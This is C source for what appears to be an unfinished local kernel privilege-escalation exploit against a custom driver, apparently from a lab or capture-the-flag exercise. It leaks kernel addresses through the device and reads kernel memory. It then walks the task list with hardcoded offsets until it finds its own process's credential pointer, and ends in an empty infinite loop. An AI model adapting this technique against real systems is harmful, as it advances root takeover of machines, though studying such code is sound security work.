#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include "kacmd.h"
#include "exp_commons.h"

#define TASK_PID 2184
#define TASK_NEXT 1928
#define TASK_CRED 2600
#define INIT_OFFSET 66816

char readbuff[TASK_CRED+sizeof(void*)];

int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    unsigned long task_addr;
    unsigned long next_task;
    void* cred_ptr;
    int pid = getpid(); 
    int kpid;

    init();

    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    task_addr = (unsigned long) kir.kernel_data + INIT_OFFSET;
    printf("[I] Init struct at %lx\n", task_addr);
    
    read_dev(vmem, readbuff, sizeof(readbuff), (void*)task_addr);
    kpid = *(int*)(readbuff+TASK_PID);
    next_task = (task_addr + TASK_NEXT);
    printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    while (kpid != pid)
    {
        read_dev(vmem, readbuff, (TASK_CRED-TASK_NEXT)+sizeof(void*), (void*)next_task);
        kpid = *(int*)(readbuff+TASK_PID-TASK_NEXT);
        next_task = *(unsigned long*)readbuff;
        printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    }
    cred_ptr = (void*)(readbuff+TASK_CRED-TASK_NEXT);

    printf("[I] found our credentials at: %p\n", cred_ptr);
    while(1){
    kpid++;
    }
    
    

}
